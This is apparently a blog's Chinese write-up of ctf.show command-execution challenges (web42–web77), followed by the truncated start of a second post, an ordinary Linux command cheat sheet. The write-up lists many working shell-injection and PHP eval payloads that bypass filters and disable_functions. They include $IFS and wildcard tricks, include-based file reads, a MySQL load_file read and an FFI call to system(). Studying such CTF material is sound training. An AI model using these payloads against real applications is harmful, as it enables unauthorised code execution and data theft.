<h1 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/dev/<span class="literal">null</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span>，让所有的输出流（包括错误的和正确的）都定向到空设备丢弃</span><br><span class="line">所以不能让后面执行，所以需要把后面截断ls;%<span class="number">0</span>a,后面不用多说了吧,还可以用%<span class="number">26</span>以及||</span><br></pre></td></tr></table></figure>


<h1 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h1><p>和42没多大区别。。。。，过滤了cat<code>nl%20flag.php%0a</code></p>
<h1 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h1><p>过滤了flag,没啥好说的通配符呗</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=nl%<span class="number">20</span>fl*%<span class="number">0</span>a</span><br></pre></td></tr></table></figure>

<h1 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h1><p>多过滤了一个空格，总所周知php环境下可以用%09代题空格<br>c&#x3D;nl%09fl*%0a<br>或者使用内联执行<br>c&#x3D;echo反引号nl$IFS*反引号%0A</p>
<h1 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h1><p>多过滤了一些数字啥的，等于没来，然后过滤了flag也可以其他姿势\ ‘’ “”等等都行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=nl%<span class="number">09</span>fla\g.php%<span class="number">0</span>a</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>还可以是,因为||默认是前面成功则不执行后面</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=nl%<span class="number">09</span>fla\g.php||</span><br></pre></td></tr></table></figure>


<h1 id="web47-48"><a href="#web47-48" class="headerlink" title="web47-48"></a>web47-48</h1><p>过滤了一点命令等于没说</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=nl&lt;fla<span class="string">&#x27;&#x27;</span>g.php||</span><br></pre></td></tr></table></figure>


<h1 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h1><p>看了一眼，也就是多过滤了几个命令而已，这里当作练习多给点payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">payload1:c=nl%<span class="number">09</span>fla\g.php||</span><br><span class="line">payload2:c=nl%<span class="number">09</span>fla\g.php%<span class="number">0</span>a</span><br><span class="line">payload3:c=nl%<span class="number">09</span>fla<span class="string">&#x27;&#x27;</span>g.php%<span class="number">0</span>a</span><br><span class="line">payload4:c=nl%<span class="number">09</span>fla<span class="string">&quot;&quot;</span>g.php%<span class="number">0</span>a</span><br><span class="line">payload5:c=vi%<span class="number">09</span>fla\g.php%<span class="number">0</span>a</span><br><span class="line">payload6:c=tac%<span class="number">09</span>fla\g.php%<span class="number">0</span>a</span><br><span class="line">payload7:c=uniq%<span class="number">09</span>fla\g.php%<span class="number">0</span>a</span><br><span class="line">payload8:c=nl&lt;fla<span class="string">&#x27;&#x27;</span>g.php||</span><br><span class="line">payload9:c=nl%<span class="number">09</span>fla\g.php%<span class="number">26</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h1><p>我看了一眼%09被过滤了，除此之外也没啥新的基本上，随便来个payload进入下一关吧</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=nl&lt;fla\g.php||</span><br></pre></td></tr></table></figure>


<h1 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h1><p>啊这，看了一眼%也被过滤了，不过也没啥，还是上一道的payloadc：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">nl&lt;fla\g.php||</span><br></pre></td></tr></table></figure>


<h1 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h1><p>虽然很多能当空格的都被过滤了但是，<code>$</code>却没有过滤，那么很明显了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=nl<span class="variable">$IFS</span>\fla\g.php||</span><br></pre></td></tr></table></figure>


<h1 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h1><p>感觉换了一个系列吧，这里随便来两个payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">payload1:c<span class="string">&#x27;&#x27;</span>at$&#123;IFS&#125;fla<span class="string">&#x27;&#x27;</span>g.p<span class="string">&#x27;&#x27;</span>hp</span><br><span class="line">payload2:c=nl<span class="variable">$IFS</span>\fla\g.php</span><br></pre></td></tr></table></figure>




<h1 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h1><p>加强了正则表达式，通配符就行了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=/bin/c??$&#123;IFS&#125;????????</span><br><span class="line">c=/bin/c??<span class="variable">$IFS</span>????????</span><br></pre></td></tr></table></figure>


<h1 id="web55-56"><a href="#web55-56" class="headerlink" title="web55-56"></a>web55-56</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    url = <span class="string">&quot;http://44875025-cec2-4154-8d87-34cbdcff5f27.chall.ctf.show/?c=.+/???/????????[@-[]&quot;</span></span><br><span class="line">    r = requests.<span class="title function_ invoke__">post</span>(url, files=&#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&#x27;1.php&#x27;</span>, b<span class="string">&#x27;cat flag.php&#x27;</span>)&#125;)</span><br><span class="line">    <span class="keyword">if</span> r.text.<span class="title function_ invoke__">find</span>(<span class="string">&quot;flag&quot;</span>) &gt;<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">print</span>(r.text)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p><img src="https://s2.loli.net/2022/03/26/ez4BhNt5li6Zy3n.png"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=/???/????<span class="number">64</span> ????????</span><br></pre></td></tr></table></figure>


<h1 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h1><p>这道题的目的是构造<code>36</code>这个数字,这里利用了<code>$(( ))与整数运算</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$(())------是-<span class="number">1</span></span><br><span class="line">$((~<span class="number">37</span>))------是<span class="number">36</span></span><br><span class="line">所以我们只需要保证中间是-<span class="number">37</span>即可，</span><br><span class="line">$((~$(())$(())))---是<span class="number">1</span></span><br><span class="line">所以</span><br><span class="line">$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))代表<span class="number">36</span>，即可获取flag</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web58"><a href="#web58" class="headerlink" title="web58"></a>web58</h1><p>接下来的系列是绕过disable_functions系列，为了锻炼自己我决定多尝试几种姿势，都是从羽师傅那里学习到的，参考链接见下方</p>
<p>首先要获取文件路径，在这里我们可以用两种方式，我暂时想到这两种</p>
<p><code>c=print_r(scandir(dirname(&#39;``**FILE**``&#39;)));</code></p>
<p><code>c=$a=new DirectoryIterator(&#39;glob:///*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;</code>因为没有任何过滤我们便可以读取任意的文件</p>
<p><code>c=$a=opendir(&quot;./&quot;); while (($file = readdir($a)) !== false)&#123;echo $file . &quot;&lt;br&gt;&quot;; &#125;;</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//通过单一函数读取文件</span></span><br><span class="line">c=<span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">c=<span class="title function_ invoke__">readfile</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">c=<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file</span>(<span class="string">&#x27;flag.php&#x27;</span>));</span><br><span class="line">c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">file</span>(<span class="string">&#x27;flag.php&#x27;</span>));</span><br><span class="line"><span class="comment">//这里做一个解释`file — 把整个文件读入一个数组中`</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">通过fopen去读取文件内容，这里介绍下函数</span><br><span class="line"><span class="title function_ invoke__">fread</span>()</span><br><span class="line"><span class="title function_ invoke__">fgets</span>()</span><br><span class="line"><span class="title function_ invoke__">fgetc</span>()</span><br><span class="line"><span class="title function_ invoke__">fgetss</span>()</span><br><span class="line"><span class="title function_ invoke__">fgetcsv</span>()</span><br><span class="line"><span class="title function_ invoke__">gpassthru</span>()</span><br><span class="line">payload:</span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$a</span>);<span class="keyword">echo</span> <span class="variable">$line</span>;&#125;<span class="comment">//一行一行读取</span></span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = <span class="title function_ invoke__">fgetc</span>(<span class="variable">$a</span>);<span class="keyword">echo</span> <span class="variable">$line</span>;&#125;<span class="comment">//一个一个字符读取</span></span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = <span class="title function_ invoke__">fgetcsv</span>(<span class="variable">$a</span>);<span class="title function_ invoke__">var_dump</span>(<span class="variable">$line</span>);&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//通过高亮显示php文件</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">&quot;flag.php&quot;</span>);             </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;flag.php&quot;</span>);             </span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web59"><a href="#web59" class="headerlink" title="web59"></a>web59</h1><p>首先查找flag文件的地址<code>c=print_r(scandir(&#39;./&#39;));</code>找到在当前目录下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//paylaod汇总</span></span><br><span class="line">c=<span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">c=<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file</span>(<span class="string">&quot;flag.php&quot;</span>)); </span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$a</span>);<span class="keyword">echo</span> <span class="variable">$line</span>;&#125;</span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = <span class="title function_ invoke__">fgetc</span>(<span class="variable">$a</span>);<span class="keyword">echo</span> <span class="variable">$line</span>;&#125;</span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = <span class="title function_ invoke__">fgetcsv</span>(<span class="variable">$a</span>);<span class="title function_ invoke__">print_r</span>(<span class="variable">$line</span>);&#125;</span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">echo</span> <span class="title function_ invoke__">fread</span>(<span class="variable">$a</span>,<span class="string">&quot;1000&quot;</span>);</span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">echo</span> <span class="title function_ invoke__">fpassthru</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web60"><a href="#web60" class="headerlink" title="web60"></a>web60</h1><p>首先查找flag文件的地址<code>c=print_r(scandir(&#39;./&#39;));</code>找到在当前目录下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//payload汇总</span></span><br><span class="line">c=<span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = <span class="title function_ invoke__">fgetc</span>(<span class="variable">$a</span>);<span class="keyword">echo</span> <span class="variable">$line</span>;&#125;</span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = <span class="title function_ invoke__">fgetcsv</span>(<span class="variable">$a</span>);<span class="title function_ invoke__">print_r</span>(<span class="variable">$line</span>);&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>同时记录一个,但是这道题不能用<code>$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetss($a);echo $line;&#125; //php7.3版本后 该函数已不再被使用</code>还有新姿势</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//通过复制，重命名读取php文件内容（函数执行后，访问url/flag.txt）</span></span><br><span class="line"><span class="title function_ invoke__">copy</span>()</span><br><span class="line"><span class="title function_ invoke__">rename</span>()</span><br><span class="line"><span class="comment">//用法：</span></span><br><span class="line"><span class="title function_ invoke__">copy</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;flag.txt&quot;</span>);             <span class="comment">//过60</span></span><br><span class="line"><span class="title function_ invoke__">rename</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;flag.txt&quot;</span>);           <span class="comment">//过60</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web61-65"><a href="#web61-65" class="headerlink" title="web61-65"></a>web61-65</h1><p>为了熟悉学习新姿势<code>c=$a=opendir(&#39;./&#39;);while(($file = readdir($a)) !=false)&#123;echo $file.&quot; &quot;;&#125;</code>或者<code>c=print_r(scandir(current(localeconv())));</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//payload:</span></span><br><span class="line">c=<span class="title function_ invoke__">show_source</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">c=<span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">c=<span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>())))));</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web66-67"><a href="#web66-67" class="headerlink" title="web66-67"></a>web66-67</h1><p>扫描目录<code>c=var_dump(scandir(&quot;/&quot;));</code>,发现是<code>flag.txt</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//下面是payload</span></span><br><span class="line">c=<span class="keyword">include</span>(<span class="string">&#x27;/flag.txt&#x27;</span>);</span><br><span class="line">c=<span class="keyword">require</span>(<span class="string">&#x27;/flag.txt&#x27;</span>);</span><br><span class="line">c=<span class="keyword">require_once</span>(<span class="string">&#x27;/flag.txt&#x27;</span>);</span><br><span class="line">c=<span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;/flag.txt&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web68-70"><a href="#web68-70" class="headerlink" title="web68-70"></a>web68-70</h1><p>快乐第一步扫描目录<code>c=$a=new DirectoryIterator(&#39;glob:///*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//payload介绍</span></span><br><span class="line">c=<span class="keyword">include</span>(<span class="string">&#x27;/flag.txt&#x27;</span>);</span><br><span class="line">c=<span class="keyword">require</span>(<span class="string">&#x27;/flag.txt&#x27;</span>);</span><br><span class="line">c=<span class="keyword">require_once</span>(<span class="string">&#x27;/flag.txt&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h1><p>代码审计,这里先介绍几个函数<br>ob_get_contents — 返回输出缓冲区的内容<br>ob_end_clean — 清空（擦除）缓冲区并关闭输出缓冲</p>
<p>然后看这里有一句官方的介绍</p>
<blockquote>
<p>此函数丢弃最顶层输出缓冲区的内容并关闭这个缓冲区。如果想要进一步处理缓冲区的内容，必须在ob_end_clean()之前调用ob_get_contents()，因为当调用ob_end_clean()时缓冲区内容将被丢弃。</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;system(&quot;ls&quot;);&#x27;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//在网页中会输出内容</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;system(&quot;ls&quot;);&#x27;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line"><span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;system(&quot;ls&quot;);&#x27;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line"><span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>;</span><br><span class="line"><span class="comment">//在这里则在网页当中没有输出内容，不难看出其取得了缓冲区的内容并清空了缓冲区</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>所以不难想出payload<code>c=require_once(&#39;/flag.txt&#39;);exit();</code>这里通过<code>exit();</code>使程序提前退出，绕过后面的正则表达式</p>
<h1 id="web72"><a href="#web72" class="headerlink" title="web72"></a>web72</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;?&gt;&lt;?php echo 111;?&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>这里的?&gt;是为了闭合前面&lt;?php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">payload:https:<span class="comment">//github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php</span></span><br><span class="line">需要把里面的payload进行url编码</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web73-74"><a href="#web73-74" class="headerlink" title="web73-74"></a>web73-74</h1><p>第一步扫描目录</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27; &#x27;</span>);&#125; <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">payload:</span><br><span class="line">c=<span class="keyword">include</span>(<span class="string">&quot;/flagc.txt&quot;</span>);<span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">c=<span class="keyword">require</span>(<span class="string">&quot;/flagc.txt&quot;</span>);<span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">c=<span class="keyword">require_once</span>(<span class="string">&quot;/flagc.txt&quot;</span>);<span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web75-76"><a href="#web75-76" class="headerlink" title="web75-76"></a>web75-76</h1><p>第一步扫描目录</p>
<p><code>c=$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#39; &#39;);&#125;exit(0);</code></p>
<p>利用mysql load_file读文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="keyword">try</span> &#123;<span class="variable">$dbh</span> = <span class="keyword">new</span> <span class="title class_">PDO</span>(<span class="string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;root&#x27;</span>);<span class="keyword">foreach</span>(<span class="variable">$dbh</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) <span class="keyword">as</span> <span class="variable">$row</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span>(<span class="variable">$row</span>[<span class="number">0</span>]).<span class="string">&quot;|&quot;</span>; &#125;<span class="variable">$dbh</span> = <span class="literal">null</span>;&#125;<span class="keyword">catch</span> (PDOException <span class="variable">$e</span>) &#123;<span class="keyword">echo</span> <span class="variable">$e</span>-</span><br><span class="line">&gt;<span class="title function_ invoke__">getMessage</span>();<span class="keyword">exit</span>(<span class="number">0</span>);&#125;<span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web77"><a href="#web77" class="headerlink" title="web77"></a>web77</h1><p>第一遍扫描目录<br>c&#x3D;$a&#x3D;new DirectoryIterator(“glob:&#x2F;&#x2F;&#x2F;*”);foreach($a as $f){echo($f-&gt;__toString().’ ‘);}exit(0);然后发现下面有一个readflag肯定是要调用这个,不会做，看了这个FFI拓展挺神奇的，说谁php7.4版本以上才有，大家想了解可以看看下面的参考链接</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="variable">$ffi</span>=<span class="title class_">FFI</span>::<span class="title function_ invoke__">cdef</span>(<span class="string">&quot;int system(char *command);&quot;</span>, <span class="string">&quot;libc.so.6&quot;</span>);<span class="variable">$a</span>=<span class="string">&#x27;/readflag &gt; 1.txt&#x27;</span>;<span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">system</span>(<span class="variable">$a</span>);<span class="keyword">exit</span>();  </span><br><span class="line"></span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>WP</tag>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux简单总结</title>
    <url>/Linux/Linux%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>收集一些常用的，免得我忘记了ε&#x3D;ε&#x3D;ε&#x3D;(<del>￣▽￣)</del></p>
<span id="more"></span>

<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname -m                             显示机器的处理器架构</span><br><span class="line">uname -r                             显示正在使用的内核版本</span><br><span class="line">dmidecode -q                         显示硬件系统部件</span><br><span class="line">(SMBIOS / DMI) hdparm -i /dev/hda    罗列一个磁盘的架构特性</span><br><span class="line">hdparm -tT /dev/sda                  在磁盘上执行测试性读取操作系统信息</span><br><span class="line">arch                                 显示机器的处理器架构</span><br><span class="line">uname -m                             显示机器的处理器架构</span><br><span class="line">uname -r                             显示正在使用的内核版本</span><br><span class="line">dmidecode -q                         显示硬件系统部件 - (SMBIOS / DMI)</span><br><span class="line">hdparm -i /dev/hda                   罗列一个磁盘的架构特性</span><br><span class="line">hdparm -tT /dev/sda                  在磁盘上执行测试性读取操作</span><br><span class="line">cat /proc/cpuinfo                    显示CPU info的信息</span><br><span class="line">cat /proc/interrupts                 显示中断</span><br><span class="line">cat /proc/meminfo                    校验内存使用</span><br><span class="line">cat /proc/swaps                      显示哪些swap被使用</span><br><span class="line">cat /proc/version                    显示内核的版本</span><br><span class="line">cat /proc/net/dev                    显示网络适配器及统计</span><br><span class="line">cat /proc/mounts                     显示已加载的文件系统</span><br><span class="line">lspci -tv                            罗列 PCI 设备</span><br><span class="line">lsusb -tv                            显示 USB 设备</span><br><span class="line">date                                 显示系统日期</span><br><span class="line">cal 2007                             显示2007年的日历表</span><br><span class="line">date 041217002007.00                 设置日期和时间 - 月日时分年.秒</span><br><span class="line">clock -w                             将时间修改保存到 BIOS</span><br></pre></td></tr></table></figure>

<h2 id="关机-and-重启"><a href="#关机-and-重启" class="headerlink" title="关机 and 重启"></a>关机 and 重启</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shutdown -h now             关闭系统(1)</span><br><span class="line">init 0                      关闭系统(2)</span><br><span class="line">telinit 0                   关闭系统(3)</span><br><span class="line">shutdown -h hours:minutes &amp; 按预定时间关闭系统</span><br><span class="line">shutdown -h +10             10分钟后关机</span><br><span class="line">shutdown -c                 取消按预定时间关闭系统</span><br><span class="line">shutdown -r now             重启</span><br><span class="line">reboot                      重启</span><br><span class="line">logout                      注销</span><br></pre></td></tr></table></figure>

<h2 id="文件和目录"><a href="#文件和目录" class="headerlink" title="文件和目录"></a>文件和目录</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /home                      进入 / home 目录</span><br><span class="line">cd ..                         返回上一级目录</span><br><span class="line">cd ../..                      返回上两级目录</span><br><span class="line">cd                            进入个人的主目录</span><br><span class="line">cd ~user1                     进入个人的主目录</span><br><span class="line">cd -                          返回上次所在的目录</span><br><span class="line">pwd                           显示工作路径</span><br><span class="line">ls                            查看目录中的文件</span><br><span class="line">ls -F                         查看目录中的文件</span><br><span class="line">ls -l                         显示文件和目录的详细资料</span><br><span class="line">ls -a                         显示隐藏文件</span><br><span class="line">ls *[0-9]*                    显示包含数字的文件名和目录名</span><br><span class="line">tree                          显示文件和目录由根目录开始的树形结构(1)</span><br><span class="line">lstree                        显示文件和目录由根目录开始的树形结构(2)</span><br><span class="line">mkdir dir1                    创建一个叫做 dir1 的目录</span><br><span class="line">mkdir dir1 dir2               同时创建两个目录</span><br><span 